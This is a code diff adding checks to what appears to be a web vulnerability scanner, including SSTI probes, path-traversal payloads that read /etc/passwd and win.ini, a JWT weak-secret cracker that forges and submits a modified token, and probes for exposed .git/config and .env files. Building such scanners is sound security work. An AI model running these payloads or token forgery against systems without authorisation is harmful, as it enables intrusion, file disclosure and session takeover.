@@ -43,6 +43,8 @@ from __future__ import annotations
 
 import base64
 import binascii
+import hashlib
+import hmac
 import json
 import re
 import time
@@ -593,45 +595,58 @@ def _check_csrf(landing: dict[str, Any] | None, url: str) -> dict[str, Any] | No
 
 
 def _check_host_header(http: _Http, url: str) -> dict[str, Any] | None:
+    # Reverse proxies / CDNs commonly PIN the real Host but trust X-Forwarded-Host for building
+    # absolute URLs (the classic password-reset-poisoning vector) — so a raw Host probe misses
+    # every app behind such a proxy. Probe raw Host first, then X-Forwarded-Host only if the raw
+    # Host wasn't reflected. The proxy overrides Host before the app sees it, so XFH is the shape
+    # that actually reaches the modern app.
+    probe_header = "Host"
     try:
         probe = http.fetch(url, extra_headers={"Host": _MARKER_HOST})
     except _ActiveError:
         return None
-    location = (probe.get("location") or "")
+    location = probe.get("location") or ""
     body = probe.get("body") or ""
-    echoed = _MARKER_HOST in location or _MARKER_HOST in body
-    if not echoed:
-        return None
+    if _MARKER_HOST not in location and _MARKER_HOST not in body:
+        try:
+            xfh = http.fetch(url, extra_headers={"X-Forwarded-Host": _MARKER_HOST})
+        except _ActiveError:
+            return None
+        location = xfh.get("location") or ""
+        body = xfh.get("body") or ""
+        if _MARKER_HOST not in location and _MARKER_HOST not in body:
+            return None
+        probe, probe_header = xfh, "X-Forwarded-Host"
     try:
         control = http.fetch(url)
     except _ActiveError:
         control = {"location": "", "body": ""}
     if _MARKER_HOST in (control.get("location") or "") or _MARKER_HOST in (control.get("body") or ""):
-        return None  # marker present without our header → not host-driven
+        return None  # marker present without our header → not header-driven
     in_location = _MARKER_HOST in location
     where = "Location header" if in_location else "response body"
     if in_location:
-        # Host reflected into a redirect Location is genuinely actionable (password-reset
+        # Reflected into a redirect Location is genuinely actionable (password-reset
         # poisoning, cache poisoning) — confirmed.
         proof = _proof(
-            "confirmed", method=f"GET with Host: {_MARKER_HOST}", affected_asset="absolute links / redirects (password-reset poisoning, cache poisoning)",
-            observed_result="the attacker-supplied Host header was reflected into the Location header",
+            "confirmed", method=f"GET with {probe_header}: {_MARKER_HOST}", affected_asset="absolute links / redirects (password-reset poisoning, cache poisoning)",
+            observed_result=f"the attacker-supplied {probe_header} header was reflected into the Location header",
             control_result="the real Host did not produce the marker — the value is attacker-controlled",
-            evidence="marker host echoed in the Location header",
+            evidence=f"marker host echoed in the Location header (via {probe_header})",
         )
         sev = "medium"
     else:
-        # Body-only Host reflection is extremely common and usually harmless — candidate.
+        # Body-only reflection is extremely common and usually harmless — candidate.
         proof = _proof(
-            "candidate", method=f"GET with Host: {_MARKER_HOST}",
-            observed_result="the attacker-supplied Host header was reflected into the response body",
+            "candidate", method=f"GET with {probe_header}: {_MARKER_HOST}",
+            observed_result=f"the attacker-supplied {probe_header} header was reflected into the response body",
             control_result="the real Host did not produce the marker — the value is attacker-controlled",
-            limitations="Body-only Host reflection is common and usually harmless; it is actionable only where that value builds a security-relevant absolute URL (e.g. a password-reset link) or a cacheable response.",
-            proof_obligation="Show the reflected Host lands in a password-reset/confirmation link or a cacheable response — not just printed in the page.",
+            limitations="Body-only reflection is common and usually harmless; it is actionable only where that value builds a security-relevant absolute URL (e.g. a password-reset link) or a cacheable response.",
+            proof_obligation="Show the reflected host lands in a password-reset/confirmation link or a cacheable response — not just printed in the page.",
         )
         sev = "low"
-    ev = {"request_line": f"GET {url}", "request_header": f"Host: {_MARKER_HOST}", "response_status": f"HTTP {probe['status']}", "matched_value": f"{_MARKER_HOST} in {where}"}
-    return _finding("active.host-header-injection", "Host header reflected (host-header injection)", sev, "redirect", "redirect", url, proof, ev)
+    ev = {"request_line": f"GET {url}", "request_header": f"{probe_header}: {_MARKER_HOST}", "response_status": f"HTTP {probe['status']}", "matched_value": f"{_MARKER_HOST} in {where}"}
+    return _finding("active.host-header-injection", "Host / X-Forwarded-Host reflected (host-header injection)", sev, "redirect", "redirect", url, proof, ev)
 
 
 def _check_reflected_xss(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
@@ -665,9 +680,14 @@ def _check_reflected_xss(http: _Http, url: str, extra_params: list[str] | None =
 
 def _check_ssti(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
     params = _candidate_params(url, extra_params, ("q",), 2)
-    probe_payload = f"{_MARK}{{{{7*7}}}}"  # marker + {{7*7}} (a benign arithmetic expression)
-    control_payload = f"{_MARK}7*7"        # marker + the literal string '7*7'
-    evaluated = f"{_MARK}49"               # what an engine that EVALUATES {{7*7}} emits
+    # Probe the common template engines in ONE request — each 7*7 expression tagged with its OWN
+    # adjacent marker so an evaluated 49 is unambiguous, attributable to the engine, and can't
+    # coincide with page text. Covers Jinja/Twig, Freemarker/JSP-EL, ERB/EJS, Thymeleaf/Ruby.
+    _engines = (("Jinja/Twig", "{{7*7}}"), ("Freemarker/JSP-EL", "${7*7}"),
+                ("ERB/EJS", "<%= 7*7 %>"), ("Thymeleaf/Ruby", "#{7*7}"))
+    probe_payload = "".join(f"{_MARK}{i}{expr}" for i, (_n, expr) in enumerate(_engines, 1))
+    control_payload = "".join(f"{_MARK}{i}7*7" for i in range(1, len(_engines) + 1))
+    signatures = [(name, f"{_MARK}{i}49") for i, (name, _e) in enumerate(_engines, 1)]
     for param in params:
         try:
             probe = http.fetch(_with_query(url, {param: probe_payload}))
@@ -675,21 +695,22 @@ def _check_ssti(http: _Http, url: str, extra_params: list[str] | None = None) ->
         except _ActiveError:
             continue
         body, ctrl_body = probe.get("body") or "", control.get("body") or ""
-        # Confirmed: the template expression {{7*7}} was EVALUATED to 49 immediately
-        # after our unique marker (server-side engine execution), and the literal-
-        # arithmetic control did NOT yield marker+49 (rules out a coincidental '49').
-        # We only INSPECT strings; the arithmetic is evaluated by the target's own
-        # engine — no file read, no code, no RCE payload.
-        if evaluated in body and evaluated not in ctrl_body:
+        # Confirmed: an engine EVALUATED one of the expressions to 49 immediately after its
+        # unique marker (server-side execution), and the literal-arithmetic control did NOT yield
+        # marker+49 (rules out a coincidental '49'). We only INSPECT strings; the arithmetic is
+        # evaluated by the target's own engine — no file read, no code, no RCE payload.
+        hit = next(((name, sig) for name, sig in signatures if sig in body and sig not in ctrl_body), None)
+        if hit:
+            engine, sig = hit
             proof = _proof(
-                "confirmed", method=f"GET with {param}={probe_payload}",
+                "confirmed", method=f"GET with {param}=<multi-engine 7*7 template probe>",
                 affected_asset="the server-side template/rendering context (a path to RCE on many engines)",
-                observed_result=f"the '{param}' parameter's {{{{7*7}}}} expression was evaluated to 49 by the server-side template engine",
+                observed_result=f"the '{param}' parameter's {engine} template expression was evaluated to 49 by the server-side engine",
                 control_result="a literal '7*7' control did NOT produce 49 — proving the engine evaluated the expression rather than echoing it",
-                evidence=f"the marker immediately followed by the evaluated result ({evaluated}) appears in the response body",
+                evidence=f"the marker immediately followed by the evaluated result ({sig}) appears in the response body",
             )
             ev = {"request_line": f"GET {_with_query(url, {param: probe_payload})}", "response_status": f"HTTP {probe['status']}",
-                  "matched_value": f"{{{{7*7}}}} evaluated to 49 ({evaluated})"}
+                  "matched_value": f"template expression evaluated to 49 ({engine})"}
             return _finding("active.ssti", f"Server-side template injection via '{param}' parameter", "high", "injection", "ssti", url, proof, ev)
     return None
 
@@ -1144,6 +1165,213 @@ def _check_jwt_alg_none(http: _Http, url: str) -> dict[str, Any] | None:
     return None
 
 
+# A small, CONSTANT list of the notoriously-weak HMAC signing secrets that turn up in real
+# programs (framework defaults, tutorials, the top of every jwt-cracking list). This is a
+# known-bad check, not a fuzzing wordlist — kept tiny on purpose.
+_JWT_WEAK_SECRETS: tuple[str, ...] = (
+    "secret", "secretkey", "secret_key", "password", "changeme", "change_me", "admin",
+    "jwt", "jwtsecret", "jwt_secret", "token", "key", "private", "test", "root",
+    "your-256-bit-secret", "your_jwt_secret", "supersecret", "s3cr3t", "qwerty", "123456",
+    "0000", "default", "example", "mysecret", "my_secret", "app_secret", "hmac", "signature",
+)
+_JWT_HS_DIGEST = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+
+
+def _crack_jwt_hs_secret(token: str) -> tuple[str, str] | None:
+    """OFFLINE-recover a weak HMAC secret for an HS256/384/512 token by byte-comparing the real
+    signature against HMAC(secret, "header.payload") for each candidate. Zero network. Returns
+    (secret, alg) on a self-certifying match, else None — the compare is cryptographic
+    byte-equality over a 256+-bit MAC, so it cannot false-positive."""
+    parts = token.split(".")
+    if len(parts) != 3 or not all(parts):
+        return None
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+        real_sig = _b64url_decode(parts[2])
+    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
+        return None
+    alg = str(header.get("alg", "")).strip().upper() if isinstance(header, dict) else ""
+    digest = _JWT_HS_DIGEST.get(alg)
+    if digest is None:
+        return None
+    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
+    for secret in _JWT_WEAK_SECRETS:
+        expected = hmac.new(secret.encode("utf-8"), signing_input, digest).digest()
+        if len(expected) == len(real_sig) and hmac.compare_digest(expected, real_sig):
+            return secret, alg
+    return None
+
+
+def _check_jwt_weak_secret(http: _Http, url: str) -> dict[str, Any] | None:
+    """Recover a weak HMAC signing secret for the operator's own JWT (OFFLINE, self-certifying),
+    then corroborate by signing a MINIMALLY-MODIFIED benign token the operator never issued and
+    showing the server accepts it. Opt-in-by-having-auth (never invents a session); no privilege
+    claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens."""
+    found = _find_jwt_credential(http.auth)
+    if found is None:
+        return None
+    header_name, real_token, rebuild = found
+    cracked = _crack_jwt_hs_secret(real_token)
+    if cracked is None:
+        return None  # the offline crack IS the finding-cost; no crack -> silent, zero requests
+    secret, alg = cracked
+    parts = real_token.split(".")
+    try:
+        payload = json.loads(_b64url_decode(parts[1]))
+    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
+        payload = {}
+    payload = dict(payload) if isinstance(payload, dict) else {}
+    payload["greyiq_poc"] = _MARK  # a benign marker claim — NOT a role/scope/sub privilege field
+    digest = _JWT_HS_DIGEST[alg]
+    new_header = _b64url_encode(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode("utf-8"))
+    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
+    new_sig = _b64url_encode(hmac.new(secret.encode("utf-8"), f"{new_header}.{new_payload}".encode("ascii"), digest).digest())
+    forged = f"{new_header}.{new_payload}.{new_sig}"
+    # The offline crack already self-certifies; the live request only corroborates. A network
+    # failure keeps the finding confirmed (the crypto is the proof).
+    server_note = "the recovered secret proves forgery offline (self-certifying); not sent to the server"
+    try:
+        baseline = http.fetch(url)
+        probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
+        if 200 <= int(probe.get("status") or 0) < 300 and 200 <= int(baseline.get("status") or 0) < 300:
+            server_note = (f"a token forged with the recovered secret (a claim the operator never issued) was accepted "
+                           f"(HTTP {probe['status']}), matching the real-token baseline (HTTP {baseline['status']})")
+    except _ActiveError:
+        pass
+    proof = _proof(
+        "confirmed", method=f"offline HMAC-{alg} crack of the JWT signing secret",
+        affected_asset="every identity/role/scope the token asserts — arbitrary token forgery",
+        observed_result=f"the {alg} signing secret is a well-known weak value ('{secret}'), recovered offline by byte-matching HMAC-{alg} of the token's own signing input",
+        control_result=server_note,
+        evidence=f"HMAC-{alg}(header.payload, weak-secret) equals the token's real signature — cryptographic byte-equality, self-certifying",
+    )
+    ev = {"request_line": f"GET {url}", "request_header": f"{header_name}: <token forged with the recovered secret>",
+          "response_status": "offline crack (self-certifying)", "matched_value": f"weak HMAC-{alg} signing secret recovered: '{secret}'"}
+    return _finding("active.jwt-weak-secret", "JWT signed with a weak/guessable secret (arbitrary token forgery)",
+                    "critical", "jwt", "jwt", url, proof, ev)
+
+
+# Traversal payload -> the unmistakable signature of the file it reads. Each is gated by a
+# same-request benign control, so a page that merely contains these words can't false-positive.
+_LFI_PROBES: tuple[tuple[str, "re.Pattern[str]"], ...] = (
+    ("../../../../../../etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
+    ("....//....//....//....//etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
+    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
+    ("../../../../../../windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)),
+)
+
+
+def _check_path_traversal(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
+    """Confirm a path traversal / local-file read on a file-ish parameter by reading ONE
+    well-known, non-sensitive system file (/etc/passwd or win.ini) as proof and gating on its
+    unmistakable signature PLUS a benign-value control — extracting nothing else."""
+    params = _candidate_params(url, extra_params, ("file", "path", "page", "template", "doc"), 2)
+    for param in params:
+        # One control per param (not per payload) keeps the request budget in check.
+        try:
+            control = http.fetch(_with_query(url, {param: f"{_MARK}notafile"}))
+        except _ActiveError:
+            continue
+        ctrl_body = control.get("body") or ""
+        for payload, signature in _LFI_PROBES:
+            if signature.search(ctrl_body):
+                continue  # the benign control already shows this signature -> not traversal-driven
+            try:
+                probe = http.fetch(_with_query(url, {param: payload}))
+            except _ActiveError:
+                break
+            body = probe.get("body") or ""
+            if signature.search(body):
+                fname = "/etc/passwd" if "passwd" in payload else "windows/win.ini"
+                proof = _proof(
+                    "confirmed", method=f"GET with {param}={payload}",
+                    affected_asset="arbitrary local files readable by the web process (source, config, secrets)",
+                    observed_result=f"the '{param}' parameter returned the contents of {fname} — path traversal / local file inclusion",
+                    control_result="a benign filename control did NOT return the file signature — the traversal is what read it",
+                    evidence=f"the unmistakable {fname} signature appears in the response body",
+                )
+                ev = {"request_line": f"GET {_with_query(url, {param: payload})}", "response_status": f"HTTP {probe['status']}",
+                      "matched_value": f"{fname} contents disclosed via '{param}'"}
+                return _finding("active.path-traversal", f"Path traversal / local file read via '{param}' parameter",
+                                "high", "disclosure", "file-upload", url, proof, ev)
+    return None
+
+
+_GRAPHQL_INTROSPECTION_QUERY = "{__schema{queryType{name} types{name}}}"
+
+
+def _check_graphql_introspection(http: _Http, url: str) -> dict[str, Any] | None:
+    """Confirm GraphQL introspection is enabled — the schema map that turns a black-box GraphQL
+    API into a listed set of hidden queries/mutations (a lead for BOLA/BFLA). Only fires on a
+    graphql-shaped path, so it costs nothing elsewhere. GET-only, read-only."""
+    path = (urlparse(url).path or "").lower()
+    if "graphql" not in path and "graphiql" not in path:
+        return None
+    try:
+        probe = http.fetch(_with_query(url, {"query": _GRAPHQL_INTROSPECTION_QUERY}))
+    except _ActiveError:
+        return None
+    body = probe.get("body") or ""
+    ctype = (probe["headers"].get("content-type") or "").lower()
+    if '"__schema"' in body and '"queryType"' in body and ("json" in ctype or body.lstrip().startswith("{")):
+        proof = _proof(
+            "confirmed", method="GET introspection query on the GraphQL endpoint",
+            affected_asset="the full GraphQL schema — types, queries, and mutations, including operations the UI never exposes",
+            observed_result="the endpoint answered an introspection query, returning its __schema (queryType + types)",
+            control_result="introspection is enabled here; production GraphQL endpoints should disable it",
+            evidence="the response body contains the GraphQL __schema/queryType introspection result",
+        )
+        ev = {"request_line": f"GET {_with_query(url, {'query': _GRAPHQL_INTROSPECTION_QUERY})}",
+              "response_status": f"HTTP {probe['status']}", "matched_value": "__schema introspection returned"}
+        return _finding("active.graphql-introspection", "GraphQL introspection enabled (schema disclosure)",
+                        "low", "disclosure", "graphql", url, proof, ev)
+    return None
+
+
+# High-signal files that must never be web-served. Each is confirmed by its own unmistakable
+# signature AND a catch-all control, so an app that 200s everything can't false-positive.
+_EXPOSED_FILES: tuple[tuple[str, "re.Pattern[str]", str], ...] = (
+    ("/.git/config", re.compile(r"\[core\][\s\S]*repositoryformatversion", re.IGNORECASE), ".git/config (source repository)"),
+    ("/.env", re.compile(r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\S"), ".env (application secrets/config)"),
+)
+
+
+def _check_sensitive_paths(http: _Http, url: str) -> dict[str, Any] | None:
+    """Confirm a high-signal file is served (.git/config, .env) by fetching it at the origin root
+    and gating on the file's own signature PLUS a catch-all control (a path that shouldn't exist)
+    — so an app that 200s everything can't false-positive. Runs only for the site root, so it
+    probes each host's paths once, not per discovered URL. GET-only, read-only."""
+    parts = urlparse(url)
+    if (parts.path or "/").strip("/"):
+        return None  # only at the site root -> one probe set per host, not per discovered URL
+    origin = f"{parts.scheme}://{parts.netloc}"
+    try:
+        control = http.fetch(f"{origin}/{_MARK}-nonexistent-{_MARK}")
+    except _ActiveError:
+        return None
+    ctrl_body = control.get("body") or ""
+    for path, signature, name in _EXPOSED_FILES:
+        if signature.search(ctrl_body):
+            continue  # the catch-all already carries this signature -> not a genuinely served file
+        try:
+            probe = http.fetch(f"{origin}{path}")
+        except _ActiveError:
+            break
+        body = probe.get("body") or ""
+        status = int(probe.get("status") or 0)
+        if 200 <= status < 300 and signature.search(body) and body != ctrl_body:
+            proof = _proof(
+                "confirmed", method=f"GET {path}",
+                affected_asset="source/config/secrets served directly by the web server",
+                observed_result=f"{name} is served at {path} (HTTP {status}) with its characteristic contents",
+                control_result="a non-existent control path did NOT return this content — the file is genuinely exposed, not a catch-all 200",
+                evidence=f"the response body carries the unmistakable {name} signature",
+            )
+            ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}", "matched_value": f"{name} exposed"}
+            return _finding("active.exposed-file", f"Sensitive file exposed: {path}", "high", "disclosure", "disclosure", url, proof, ev)
+    return None
+
+
 def verify_active(
     target_url: str,
     findings: list[dict[str, Any]],
@@ -1210,6 +1438,13 @@ def verify_active(
     checks: list[Callable[[], dict[str, Any] | None]] = [
         lambda: _check_clickjacking(http, sanitized, landing),
         lambda: _check_csrf(landing, sanitized),
+        # Self-gated cheap checks run FIRST so the network-heavy probes below can't exhaust the
+        # request budget before they're reached: alg:none / weak-secret are no-ops unless the
+        # operator supplied a real JWT (weak-secret cracks the HMAC key OFFLINE and spends requests
+        # only on a hit), and GraphQL introspection only fires on a graphql-shaped path.
+        lambda: _check_jwt_alg_none(http, sanitized),
+        lambda: _check_jwt_weak_secret(http, sanitized),
+        lambda: _check_graphql_introspection(http, sanitized),
         lambda: _check_cors(http, sanitized),
         lambda: _check_open_redirect(http, sanitized, discovered_params),
         lambda: _check_host_header(http, sanitized),
@@ -1221,9 +1456,13 @@ def verify_active(
         lambda: _check_crlf(http, sanitized, discovered_params),
         # Open-bucket is GET-only and scope-gated; safe in the default pass.
         lambda: _check_open_bucket(http, landing, scope, settings),
-        # GET-only and self-gating: a no-op unless the operator supplied a real
-        # JWT-shaped credential to forge from, so it's safe in the default pass too.
-        lambda: _check_jwt_alg_none(http, sanitized),
+        # Sensitive-file exposure (.git/.env) only probes at the site root, so it's one cheap
+        # set per host; signature + catch-all control keeps it false-positive-proof.
+        lambda: _check_sensitive_paths(http, sanitized),
+        # Path traversal / LFI reads ONE well-known system file as proof (signature + control),
+        # extracting nothing else; GET-only. Heaviest of the new checks, so it runs LAST and only
+        # uses whatever request budget the earlier checks left.
+        lambda: _check_path_traversal(http, sanitized, discovered_params),
     ]
     # Time-based blind SQLi is the only check that emits an executing payload (a bounded
     # SLEEP), so it is OPT-IN — appended only when the operator explicitly enables it.
